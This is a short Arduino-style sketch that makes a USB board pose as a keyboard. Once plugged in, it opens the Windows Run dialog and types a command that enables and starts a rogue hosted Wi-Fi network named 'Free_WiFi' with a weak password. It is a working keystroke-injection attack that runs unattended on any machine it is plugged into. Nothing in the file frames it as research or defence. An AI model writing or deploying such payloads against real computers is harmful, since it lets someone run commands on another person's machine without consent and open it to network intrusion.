#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  
  Keyboard.println(F("cmd /c netsh wlan set hostednetwork mode=allow ssid=Free_WiFi key=12345678 & netsh wlan start hostednetwork"));
}

void loop() {}
